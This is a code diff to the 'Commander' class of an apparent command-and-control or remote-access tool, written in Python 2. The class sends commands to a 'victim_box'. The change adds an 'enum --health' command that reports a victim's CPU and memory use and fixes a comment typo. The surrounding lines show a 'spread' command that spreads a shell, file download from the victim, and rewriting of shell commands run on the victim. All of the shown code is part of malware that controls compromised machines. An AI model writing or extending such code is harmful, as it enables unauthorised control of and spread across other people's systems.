@@ -66,6 +66,10 @@ class Commander(object):
                     elif command == 'spread':
                         victim_box.spread_shell()
 
+                    # displays the target's 'health' (CPU, Memory usage etc)
+                    elif command == 'enum --health':
+                        victim_box.enum_health()
+
                     elif command.startswith('download'):
                         if len(command.split()) < 2:
                             print '\n[!] Usage: download [remote_file_path] [local_file_path| <optional argument>]'
@@ -110,7 +114,7 @@ class Commander(object):
 
                             else:
                                 # setting aliases for some commands to avoid
-                                # issues realted to empty directorie
+                                # issues realted to empty directories
                                 command = command.replace('ls', 'ls -lha') if command.split()[0] == 'ls' else command
                                 command = command.replace('rm', 'rm -v') if command.split()[0] == 'rm' else command
                                 command = command.replace('cp', 'cp -v') if command.split()[0] == 'cp' else command
